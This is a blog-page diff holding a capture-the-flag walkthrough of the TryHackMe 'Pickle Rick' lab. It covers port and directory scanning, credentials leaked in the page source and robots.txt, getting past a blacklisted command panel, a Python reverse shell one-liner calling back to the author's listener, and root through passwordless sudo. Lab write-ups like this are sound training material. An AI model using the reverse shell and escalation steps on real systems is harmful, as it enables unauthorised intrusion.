@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang=en>
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>⚡</text></svg>">
+        <link rel="stylesheet" href="./style.css">
+        <title></title>
+        <meta name="description" content="LinuxSauce - Tastes linux-y."
+    </head>
+    <body>
+
+<h2> Pickle Rick CTF Challenge Walkthrough :</h2>
+<p>
+<a href="https://tryhackme.com/room/picklerick">https://tryhackme.com/room/picklerick</a>
+<img src="https://i.imgur.com/o9pyhyU.jpg" alt="alt text"/>
+</p>
+<ul>
+<li>By <a href="https://tryhackme.com/p/suntsam">suntsam</a> @tryhackme</li>
+</ul>
+
+<h2> IP</h2>
+
+<ul>
+<li>Let's export the IP of the box as a variable, which makes things easier.  </li>
+</ul>
+
+<pre><code>
+export ip=10.10.53.47
+</code></pre>
+
+<h2> Nmap results</h2>
+
+<pre><code>
+nmap -sC -sV &#36;ip
+
+port   state service version
+22/tcp open  ssh     openssh 7.2p2 ubuntu 4ubuntu2.6 (ubuntu linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 a8:a8:45:1a:71:e1:d5:d5:19:37:e9:5b:9d:11:bb:5f (rsa)
+|   256 19:8a:cc:f2:cd:f2:c9:41:16:2b:97:87:8d:37:39:88 (ecdsa)
+|_  256 3a:16:3b:71:7d:73:13:3c:79:df:01:5c:4b:3b:5f:62 (ed25519)
+80/tcp open  http    apache httpd 2.4.18 ((ubuntu))
+|_http-server-header: apache/2.4.18 (ubuntu)
+|_http-title: rick is sup4r cool
+    service info: os: linux; cpe: cpe:/o:linux:linux_kernel
+</code></pre>
+
+<h2> Page source</h2>
+
+<ul>
+<li>Hit Ctrl+U (to quickly view the webpage source)</li>
+</ul>
+
+<ul>
+<li>After reading the source for a bit you get this.</li>
+</ul>
+
+<pre><code>
+Note to self, remember username!
+
+Username: R1ckRul3s
+</code></pre>
+
+<h2> dirbuster</h2>
+
+<pre><code>
+dirbuster -u http://&#36;ip -l /usr/share/wordlists/dirbuster/directory-list-1.3-medium.txt -v
+
+Starting OWASP DirBuster 1.0-RC1
+Starting dir/file list based brute forcing
+Dir found: / - 200
+File found: /login.php - 200
+Dir found: /icons/ - 403
+Dir found: /assets/ - 200
+File found: /assets/bootstrap.min.js - 200
+File found: /portal.php - 302
+File found: /assets/jquery.min.js - 200
+File found: /assets/bootstrap.min.css - 200
+Dir found: /icons/small/ - 403
+File found: /robots.txt - 200
+</code></pre>
+
+<h2> /robots.txt</h2>
+
+<ul>
+<li>This looks like the password for the R1ckRul3s account.</li>
+</ul>
+
+<pre><code>
+Wubbalubbadubdub
+</code></pre>
+
+<h2> Let's try to login</h2>
+
+<ul>
+<li>Using R1ckRul3s and Wubbalubbadubdub as the password we can login at http://10.10.53.47/login.php</li>
+</ul>
+
+<ul>
+<li>You get an interactive commandline</li>
+</ul>
+
+<h2> Ughh!! what??</h2>
+
+<ul>
+<li>After playing around a bit and viewing the source( grep . * ) of the page you can see that few words are blacklisted.</li>
+</ul>
+
+<ul>
+<li>Cat command (blacklisted by rick)</li>
+</ul>
+
+<ul>
+<li>Command Panel</li>
+</ul>
+
+<pre><code>
+Command disabled to make it hard for future PICKLEEEE RICCCKKKK.
+
+ls -a Sup3rS3cretPickl3Ingred.txt
+rwxr-xr-x 1 ubuntu ubuntu 17 Feb 10  2019 Sup3rS3cretPickl3Ingred.txt
+
+</code></pre>
+
+<ul>
+<li>It is not possible to read the content of the file using cat/head/more command (we can use the less/grep command)</li>
+</ul>
+
+<pre><code>
+grep .  *
+</code></pre>
+
+<ul>
+<li>It dumps out everything in that folder ;)</li>
+</ul>
+
+<h2> 1st Flag</h2>
+
+<ul>
+<li>Got the first flag by doing</li>
+</ul>
+
+<pre><code>
+grep . Sup3rS3cretPickl3Ingred.txt
+
+mx. mxxxxxxxx hxxx
+
+</code></pre>
+
+<h2> The clue</h2>
+
+<pre><code>
+grep . clue.txt
+Look around the file system for the other ingredient.
+</code></pre>
+
+<h2> Getting a reverse shell</h2>
+
+<ul>
+<li>The webpage cmdline is slow and clumsy </li>
+</ul>
+
+<ul>
+<li><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">reverse shell cheat sheat</a></li>
+</ul>
+
+<ul>
+<li>Trying python3 rev shell</li>
+</ul>
+
+<pre><code>
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(("10.8.18.148",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+</code></pre>
+
+<ul>
+<li>We got our rev shell callback</li>
+</ul>
+
+<ul>
+<li>On the my machine</li>
+</ul>
+
+<ul>
+<li>we can stabilize the shell using few one-liners(I prefer doing it in python)</li>
+</ul>
+
+<pre><code>
+[suntsam@host]&#36;nc -nvlp 1234
+listening on 0.0.0.0 1234
+Connection received on 10.10.53.47 48592
+/bin/sh: 0: can't access tty; job control turned off
+&#36;
+&#36;python -c 'import pty; pty.spawn("/bin/bash")'
+
+hit ctrl+z
+
+[suntsam@host]&#36;stty raw -echo"
+
+[suntsam@host]&#36;fg
+
+[www-data@ip-10-10-53-47]&#36;export TERM=xterm
+
+[www-data@ip-10-10-53-47]&#36;
+</code></pre>
+
+<h2> 2nd flag</h2>
+
+<pre><code>
+[www-data@ip-10-10-53-47]&#36;cd /home/rick
+
+[www-data@ip-10-10-53-47]&#36;less sxxxxx ixxxxx
+
+1 jxxxx txxx
+</code></pre>
+
+<h2> Privilege escalation</h2>
+
+<ul>
+<li>Guessing that the next flag is in the root folder</li>
+</ul>
+
+<ul>
+<li>Run sudo -l to see what you can do what permissions this user we are now.(www-data)</li>
+</ul>
+
+<ul>
+<li><code></code><code>sudo -l</code><code></code> basically lists the privileges for a user instead of for the invoking user.</li>
+</ul>
+
+<ul>
+<li><code></code><code>sudo su </code><code></code> will put you into a root environment but it will ask you for your user password instead of the root password</li>
+</ul>
+
+<ul>
+<li>Once sudo has given you root privileges, su - can be executed with no password.(which is the case here)</li>
+</ul>
+
+<pre><code>
+[www-data@ip-10-10-53-47]&#36;sudo -l
+Matching Defaults entries for www-data on
+ip-10-10-53-47.eu-west-1.compute.internal:
+env_reset, mail_badpass,
+secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+User www-data may run the following commands on
+ip-10-10-53-47.eu-west-1.compute.internal:
+*** (ALL) NOPASSWD: ALL ***
+</code></pre>
+
+<h2> 3rd flag</h2>
+
+<pre><code>
+[www-data@ip-10-10-53-47]&#36;sudo su -
+
+root@ip-10-10-53-47:/var/www/html# whoami
+root
+
+root@ip-10-10-53-47:/var/www/html# cd /root
+cd /root
+
+root@ip-10-10-53-47:~# ls
+ls
+3rd.txt
+snap
+
+root@ip-10-10-53-47:~# cat 3rd.txt
+cat 3rd.txt
+3rd ingredient: fxxx jxxx
+</code></pre>
+<p><i>Article posted on: 2021-03-26, last edited on: 2021-03-26, written by: sammyjeng</i></p>
+<footer>
+    <hr/>
+    <a href=".">homepage</a>
+    <a href="./rss.xml">RSS</a>
+    <a href="./atom.xml">atom</a>
+    <br>
+    <p><small>Powered by <a href="https://pedantic.software/git/blogit">blogit</a></small></p>
+</footer>
+</body></html>
